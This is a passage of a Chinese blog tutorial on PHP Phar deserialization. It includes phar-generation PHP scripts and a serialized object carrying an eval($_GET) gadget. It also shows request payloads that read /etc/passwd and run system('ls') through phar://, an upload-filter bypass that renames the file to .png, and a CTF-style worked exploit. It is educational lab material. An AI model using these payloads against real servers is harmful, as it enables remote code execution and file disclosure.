将字符串 &quot;test&quot; 作为文件内容，以 test.txt 为文件名添加到 Phar 压缩包中</span><br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">addFromString</span>(<span class="hljs-string">&quot;test.txt&quot;</span>,<span class="hljs-string">&quot;test&quot;</span>);<br><span class="hljs-comment"># 停止写入文件</span><br><span class="hljs-comment"># 调用 stopBuffering 方法，停止缓冲，并将缓冲区中的数据写入到 test.phar 文件中</span><br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">stopBuffering</span>();<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>在<code>phar.php</code>页面可以生成<code>.phar</code>文件，源码中同样定义了<code>Testobj</code>类和<code>output</code>属性，与<code>index.php</code>中的一致</li>
+<li>生成<code>.phar</code>文件部分的解析见源码</li>
+</ul>
+<p>在<code>index.php</code>页面中传入GET参数<code>filename</code>，其值为<code>/etc/passwd</code></p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-string">?f</span>ilename=<span class="hljs-regexp">/etc/passwd</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/2025/04/25/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250421181801644.png" srcset="/img/loading.gif" lazyload alt="image-20250421181801644"></p>
+<p>正常会根据文件是否存在得到一个布尔值的回显</p>
+<p>因为这里使用的是<code>file_exists</code>函数，是可以使用<code>phar://</code>伪协议的，但是可以使用<code>phar</code>伪协议并不代表一定存在<code>phar</code>反序列化漏洞，还要看能否触发魔术方法进而可以执行一些操作，在这里就是要触发<code>__destruct()</code>这个魔术方法进而可以执行命令，所以存在漏洞</p>
+<p>访问<code>phar.php</code>这个页面，然后这个页面中的代码会自动生成一个<code>test.phar</code>的文件，查看<code>tmp</code>目录下会发现生成了这个文件</p>
+<p><img src="/2025/04/25/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250421184245937.png" srcset="/img/loading.gif" lazyload alt="image-20250421184245937"></p>
+<p>可以使用<code>xxd</code>命令查看文件内容</p>
+<p><img src="/2025/04/25/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250421184338480.png" srcset="/img/loading.gif" lazyload alt="image-20250421184338480"></p>
+<p>可以看到写入了序列化后的数据</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">O:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;Testobj&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;output&quot;</span>;s:<span class="hljs-number">17</span>:<span class="hljs-string">&quot;eval(<span class="hljs-subst">$_GET</span>[&quot;</span>a<span class="hljs-string">&quot;]);&quot;</span>;&#125;<br></code></pre></td></tr></table></figure>
+
+<p>接着在<code>index.php</code>页面中查看这个文件发现是存在的</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">filename</span>=test.phar<br></code></pre></td></tr></table></figure>
+
+<p><img src="/2025/04/25/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250421183120702.png" srcset="/img/loading.gif" lazyload alt="image-20250421183120702"></p>
+<p>最后就可以利用<code>phar</code>伪协议读取这个文件，会自动将序列化部分的数据进行反序列化，然后就会自动触发<code>__destruct()</code>魔术方法，从而可以执行<code>eval($_GET[&quot;a&quot;]);</code>，也就是可以进行GET传参一个<code>a</code>进行RCE</p>
+<figure class="highlight sas"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sas">?<span class="hljs-keyword">filename</span>=phar://test.phar<span class="hljs-variable">&amp;a</span>=<span class="hljs-meta">system</span>(<span class="hljs-string">&#x27;ls&#x27;</span>);<br></code></pre></td></tr></table></figure>
+
+<p><img src="/2025/04/25/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250421184732520.png" srcset="/img/loading.gif" lazyload alt="image-20250421184732520"></p>
+<h1 id="Phar反序列化漏洞使用条件"><a href="#Phar反序列化漏洞使用条件" class="headerlink" title="Phar反序列化漏洞使用条件"></a><code>Phar</code>反序列化漏洞使用条件</h1><ul>
+<li><code>phar</code>文件可以上传到服务器端</li>
+<li>要有可用反序列化魔术方法作为跳板（就是可以通过触发魔术方法<code>__destruct()</code>或<code>__wakeup()</code>进行RCE之类的操作）</li>
+<li>要有文件操作函数，如：<code>file_exists()</code>，<code>fopen()</code>，<code>file_get_contents()</code></li>
+<li>文件操作函数的参数可控</li>
+<li>要使用的伪协议<code>phar://</code>中的字符和关键字没有被过滤</li>
+</ul>
+<p><img src="/2025/04/25/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250421191301040.png" srcset="/img/loading.gif" lazyload alt="image-20250421191301040"></p>
+<h2 id="小知识"><a href="#小知识" class="headerlink" title="小知识"></a>小知识</h2><p><strong>使用<code>phar://</code>伪协议读取文件是不看后缀的</strong></p>
+<p>如果服务器对上传的文件有限制，只能上传一些<code>png</code>、<code>jpg</code>、<code>gif</code>等图片文件，我们可以把<code>phar</code>文件修改成其他的任何一个格式的文件，并且不会受到影响</p>
+<p>如下，使用<code>mv</code>命令将<code>test.phar</code>文件修改成<code>test.png</code>文件，改变其后缀名</p>
+<p><img src="/2025/04/25/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250421185913907.png" srcset="/img/loading.gif" lazyload alt="image-20250421185913907"></p>
+<p>然后使用<code>phar</code>伪协议读取<code>test.png</code>文件仍然是可以执行命令的</p>
+<figure class="highlight sas"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sas">?<span class="hljs-keyword">filename</span>=phar://test.png<span class="hljs-variable">&amp;a</span>=<span class="hljs-meta">system</span>(<span class="hljs-string">&#x27;ls&#x27;</span>);<br></code></pre></td></tr></table></figure>
+
+<p><img src="/2025/04/25/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250421190111156.png" srcset="/img/loading.gif" lazyload alt="image-20250421190111156"></p>
+<p>所以后缀名是没有影响的，只要可以上传到服务器就行</p>
+<h1 id="Phar反序列化例题"><a href="#Phar反序列化例题" class="headerlink" title="Phar反序列化例题"></a><code>Phar</code>反序列化例题</h1><h3 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h3><p><code>index.php</code>页面源码如下</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TestObject</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;flag.php&#x27;</span>);<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>    &#125;<br>&#125;<br><span class="hljs-variable">$filename</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$filename</span>))&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">md5_file</span>(<span class="hljs-variable">$filename</span>);<br>&#125;<br><span class="hljs-comment">//upload.php</span><br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure>
+
+<p>可以发现定义了一个<code>TestObject()</code>类，存在一个<code>__destruct()</code>魔术方法可以获取<code>flag.php</code>中的flag，然后可以进行传参一个POST参数<code>file</code>，并使用<code>md5_file</code> 函数读取指定文件的内容，并基于这些内容生成哈希值，提示有一个<code>upload.php</code>页面，访问发现可以上传文件，并且根据标题可知只能上传图片文件</p>
+<p><img src="/2025/04/25/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250421191439247.png" srcset="/img/loading.gif" lazyload alt="image-20250421191439247"></p>
+<p>这里使用<code>md5_file</code> 函数读取指定文件，并且有上传文件的接口，存在<code>phar</code>反序列化漏洞，可以通过上传一个<code>phar</code>文件，并在<code>index.php</code>页面通过POST参数<code>file</code>读取文件，从而进行反序列化触发<code>__destruct()</code>魔术方法获取flag，不过指定了上传的文件只能是图片，但是在前面学习的小知识中可知可以将<code>phar</code>文件后缀改成其他的，并且不受影响，所以可以上传一个图片格式并可以被解析</p>
+<p>首先可以先试试POST传参file查看文件</p>
+<figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">file</span><span class="hljs-operator">=/</span>etc/passwd<br></code></pre></td></tr></table></figure>
+
+<p><img src="/2025/04/25/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250421192916940.png" srcset="/img/loading.gif" lazyload alt="image-20250421192916940"></p>
+<p>可以看到可以读取到<code>/etc/passwd</code>文件并输出一段哈希值</p>
+<p>这题中满足了以下条件，可以进行<code>phar</code>反序列化的利用<img src="/2025/04/25/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250421194052111.png" srcset="/img/loading.gif" lazyload alt="image-20250421194052111"></p>
+<h3 id="解题步骤"><a href="#解题步骤" class="headerlink" title="解题步骤"></a><strong>解题步骤</strong></h3><ul>
+<li>**生成一个<code>phar</code>文件：**在<code>mate-data</code>里放置一个包含<code>TestObject()</code>序列化字符串</li>
+<li><strong>上传文件：</strong><code>md5_file</code>执行伪协议，触发反序列化，从而触发<code>__destruct()</code>魔术方法执行<code>echo flag</code></li>
+</ul>
+<h3 id="开始解题"><a href="#开始解题" class="headerlink" title="开始解题"></a>开始解题</h3><p><strong>生成一个<code>phar</code>文件</strong></p>
+<p>可以在自己本地的<code>PhpStorm</code>中生成一个<code>phar</code>文件，不过注意要设置<code>PhpStorm</code>中的<code>phar.readonly</code>为<code>Off</code>，否则会出现以下报错</p>
+<p><img src="/2025/04/25/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250421194809962.png" srcset="/img/loading.gif" lazyload alt="image-20250421194809962"></p>
+<p>找到当前使用的php版本的<code>php.ini</code>文件</p>
+<p><img src="/2025/04/25/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250421195235055.png" srcset="/img/loading.gif" lazyload alt="image-20250421195235055"></p>
+<p>直接搜索找到<code>phar.readonly</code>就行，以下是原本的样子</p>
+<p><img src="/2025/04/25/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250421200406776.png" srcset="/img/loading.gif" lazyload alt="image-20250421200406776"></p>
+<p>把<code>On</code>修改为<code>Off</code>，还要把前面的分号去掉，修改后如下</p>
+<p><img src="/2025/04/25/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250421200456451.png" srcset="/img/loading.gif" lazyload alt="image-20250421200456451"></p>
+<p>然后直接运行以下脚本就可以在脚本的同一目录下生成<code>phar</code>文件了</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TestObject</span> </span>&#123;<br>&#125;<br><br>@<span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-string">&#x27;test.phar&#x27;</span>);<br><span class="hljs-variable">$phar</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Phar</span>(<span class="hljs-string">&#x27;test.phar&#x27;</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">startBuffering</span>();<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setStub</span>(<span class="hljs-string">&#x27;&lt;?php __HALT_COMPILER(); ?&gt;&#x27;</span>);<br><br><span class="hljs-variable">$o</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">TestObject</span>();<br><br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setMetadata</span>(<span class="hljs-variable">$o</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">addFromString</span>(<span class="hljs-string">&quot;test.txt&quot;</span>,<span class="hljs-string">&quot;test&quot;</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">stopBuffering</span>();<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/2025/04/25/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250421200642878.png" srcset="/img/loading.gif" lazyload alt="image-20250421200642878"></p>
+<p>然后就是在<code>upload.php</code>页面上传文件，抓包改后缀和MIME头就行</p>
+<p><img src="/2025/04/25/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250421201143536.png" srcset="/img/loading.gif" lazyload alt="image-20250421201143536"></p>
+<p>可以看到成功上传进去了</p>
+<p><img src="/2025/04/25/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250421201248601.png" srcset="/img/loading.gif" lazyload alt="image-20250421201248601"></p>
+<p>最后就是使用<code>phar</code>伪协议读取上传的文件</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">file=phar:<span class="hljs-regexp">//</span><span class="hljs-regexp">/var/</span>www<span class="hljs-regexp">/html/</span>class23<span class="hljs-regexp">/upload/</span>test.png<br></code></pre></td></tr></table></figure>
+
+<p><img src="/2025/04/25/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250421205949427.png" srcset="/img/loading.gif" lazyload alt="image-20250421205949427"></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/%E6%BC%8F%E6%B4%9E%E7%AC%94%E8%AE%B0/" class="category-chain-item">漏洞笔记</a>
+  
+  
+    <span>></span>
+    
+  <a href="/categories/%E6%BC%8F%E6%B4%9E%E7%AC%94%E8%AE%B0/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" class="category-chain-item">PHP反序列化</a>
+  
+  
+
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" class="print-no-link">#学习笔记</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>Phar反序列化</div>
+      <div>https://yschen20.github.io/2025/04/25/Phar反序列化/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>chen</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2025年4月25日</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>更新于</div>
+          <div>2025年4月25日</div>
+        </div>
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2025/04/25/%E5%9C%A8Ubuntu%E9%83%A8%E7%BD%B2docker%E5%92%8Cdocker-compose%E5%92%8C%E4%BD%BF%E7%94%A8%E5%91%BD%E4%BB%A4/" title="在Ubuntu部署docker和docker-compose和使用命令">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">在Ubuntu部署docker和docker-compose和使用命令</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2025/04/25/%E5%9C%A8Ubuntu%E4%BA%91%E6%9C%8D%E5%8A%A1%E5%99%A8%E9%83%A8%E7%BD%B2AstrBot/" title="在Ubuntu云服务器部署AstrBot">
+                        <span class="hidden-mobile">在Ubuntu云服务器部署AstrBot</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="busuanzi_container_site_pv" style="display: none">
+        总访问量 
+        <span id="busuanzi_value_site_pv"></span>
+         次
+      </span>
+    
+    
+      <span id="busuanzi_container_site_uv" style="display: none">
+        总访客数 
+        <span id="busuanzi_value_site_uv"></span>
+         人
+      </span>
+    
+    
+
+  
+
+</div>
+
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  var relativeDate = function() {
+    var updatedTime = document.getElementById('updated-time');
+    if (updatedTime) {
+      var text = updatedTime.textContent;
+      var reg = /\d{4}-\d{2}-\d{2}T\d{2}:\d{2}:\d{2}(?:Z|[+-]\d{2}:\d{2})/;
+      var matchs = text.match(reg);
+      if (matchs) {
+        var relativeTime = moment(matchs[0]).fromNow();
+        updatedTime.textContent = text.replace(reg, relativeTime);
+      }
+      updatedTime.style.display = '';
+    }
+  };
+  Fluid.utils.createScript('https://lib.baomitu.com/moment.js/2.29.4/moment.min.js', function() {
+    if (!'zh-cn'.startsWith('en')) {
+      Fluid.utils.createScript('https://lib.baomitu.com/moment.js/2.29.4/locale/zh-cn.min.js', function() {
+        relativeDate();
+      });
+    } else {
+      relativeDate();
+    }
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
